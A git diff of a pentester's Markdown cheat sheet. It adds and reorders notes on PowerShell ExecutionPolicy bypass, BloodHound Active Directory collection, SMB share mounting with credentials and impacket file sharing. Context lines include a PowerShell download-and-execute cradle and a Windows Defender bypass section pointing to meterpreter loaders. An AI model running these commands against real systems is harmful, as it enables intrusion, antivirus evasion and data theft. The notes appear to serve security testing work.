@@ -1,28 +1,33 @@
 Table of Contents
 =================
 
-* [Reconnaissance &amp; Gathering](#reconnaissance--gathering)
-   * [Mapping the Network](#mapping-the-network)
-   * [NBTscan](#nbtscan)
-   * [Nmap scan basics](#nmap-scan-basics)
-   * [DNS subdomains reconnaissance](#dns-subdomains-reconnaissance)
-* [PowerShell](#powershell)
-   * [To load a PS module into the memory](#to-load-a-ps-module-into-the-memory)
-   * [Sharing files with Windows machine](#sharing-files-with-windows-machine)
-* [PrivEsc on Windows](#privesc-on-windows)
-   * [Bypassing Windows Defender](#bypassing-windows-defender)
-* [WebApplication Hacking](#webapplication-hacking)
-   * [Create a PHP Backdoor shell](#create-a-php-backdoor-shell)
-   * [Demonstrating the possibility of steal cookies abusing of XSS vulnerability](#demonstrating-the-possibility-of-steal-cookies-abusing-of-xss-vulnerability)
-   * [Check for broken links to hijack](#check-for-broken-links-to-hijack)
-   * [Bypassing file upload WAF](#bypassing-file-upload-waf)
-* [Utils](#utils)
-   * [Shell to TT](#shell-to-tt)
-   * [Capture traffic](#capture-traffic)
-   * [Detect incoming Ping](#detect-incoming-ping)
-* [Miscellaneous](#miscellaneous)
-   * [Terminal recording](#terminal-recording)
-   * [Command output copy](#command-output-copy)
+   * [Table of Contents](#table-of-contents)
+   * [Reconnaissance &amp; Gathering](#reconnaissance--gathering)
+      * [Mapping the Network](#mapping-the-network)
+      * [NBTscan](#nbtscan)
+      * [Nmap scan basics](#nmap-scan-basics)
+      * [DNS subdomains reconnaissance](#dns-subdomains-reconnaissance)
+   * [PowerShell](#powershell)
+      * [To load a PS module into the memory](#to-load-a-ps-module-into-the-memory)
+      * [Changing <em>ExecutionPolicy</em> to Bypass](#changing-executionpolicy-to-bypass)
+   * [PrivEsc on Windows](#privesc-on-windows)
+      * [Bypassing Windows Defender](#bypassing-windows-defender)
+      * [Sharing files with Windows machine](#sharing-files-with-windows-machine)
+      * [Using BloodHound](#using-bloodhound)
+   * [WebApplication Hacking](#webapplication-hacking)
+      * [Create a PHP Backdoor shell](#create-a-php-backdoor-shell)
+      * [Demonstrating the possibility of steal cookies abusing of XSS vulnerability](#demonstrating-the-possibility-of-steal-cookies-abusing-of-xss-vulnerability)
+      * [Check for broken links to hijack](#check-for-broken-links-to-hijack)
+      * [Bypassing file upload WAF](#bypassing-file-upload-waf)
+   * [Utils](#utils)
+      * [Shell to TT](#shell-to-tt)
+      * [Capture traffic](#capture-traffic)
+      * [Detect incoming Ping](#detect-incoming-ping)
+      * [Mount SMB shares](#mount-smb-shares)
+      * [Mount VHDX virtual machines](#mount-vhdx-virtual-machines)
+   * [Miscellaneous](#miscellaneous)
+      * [Terminal recording](#terminal-recording)
+      * [Command output copy](#command-output-copy)
 
 Created by [gh-md-toc](https://github.com/ekalinin/github-markdown-toc)
 
@@ -67,11 +72,14 @@ Censys needs an API, easy to retrieve from its website.
 powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString($URL);"
 # Here call the modules you want to execute, depending on the usage of what you have downloaded
 ```
-## Sharing files with Windows machine
-**NOTE:** This technique is usefull also to share files with any Windows VM *(or the parent host)*
-```bash
-impacket-smbserver share [path] -smb2support
+
+## Changing *ExecutionPolicy* to Bypass
+The following command in PowerShell, if we have enough permissions, will change the executionPolicy so we should be able to execute, for instance, scripts.
+
+```powershell
+Set-ExecutionPolicy Bypass -Scope Process
 ```
+
 # PrivEsc on Windows
 ## Bypassing Windows Defender
 There're a [usefull scripts](https://astr0baby.wordpress.com/2019/01/26/custom-meterpreter-loader-in-2019/), from **Astr0baby's blog**, just copy-paste them.
@@ -91,6 +99,24 @@ There're a [usefull scripts](https://astr0baby.wordpress.com/2019/01/26/custom-m
 # Define the LHOST
 # Define the LPORT
 # Now the payload shall be ran into the target
+```
+
+## Sharing files with Windows machine
+**NOTE:** This technique is usefull also to share files with any Windows VM *(or the parent host)*
+```bash
+impacket-smbserver share [path] -smb2support
+```
+
+Using this simple technique we will be able to upload as much privesc tools as we want, in a easiest way.
+
+## Using BloodHound
+BloodHound is a very useful technique of Active Directory gathering. It would be a must in every Privilege Escalation we want to perform.
+We have to download SharpHound.ps1 from its last repository *(it has been changed any times, so we have to check...)*
+```powershell
+// with our local machine sharing using any technique like python -c SimpeHTTPServer or impacket-smbserver...
+Set-Execution Bypass -Scope Process
+Import-Module [PATH_TO_SHARE]\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All -JSONFolder [PATH_TO_RESULTS]
 ```
 
 # WebApplication Hacking
@@ -169,6 +195,26 @@ ping to our network interface.
 
 ```bash
 sudo tcpdump ip proto \\icmp
+```
+
+## Mount SMB shares
+Great option if we're looking for some more control among the data located in those shares exposed. If we mount locally we will be able to perform actions like "grep -ri 'any-keyword' /mnt/juicy-share", por example..
+
+We can mount SMB with the following command:
+```bash
+sudo mount -t cifs //[IP]/[SHARE_NAME] /mnt/[SHARE_NAME]
+```
+
+Of course it won't be that easy the most of the times, if we want to give credentials and domain we can use this command:
+```bash
+sudo mount -t cifs //[IP]/[SHARE_NAME] /mnt/[SHARE_NAME] -o "username=[USER],password=[PASS],domain=[DOMAIN]" /mnt/[SHARE_NAME]
+```
+
+## Mount VHDX virtual machines
+If we are given with any virtual machine export, we can mount its content with the following command line:
+
+```bash
+sudo guestmount --add /media/audit2/Disco_ext1/LadyBird/ladybird.vhdx --inspector --ro /mnt/LadyBird/
 ```
 
 # Miscellaneous
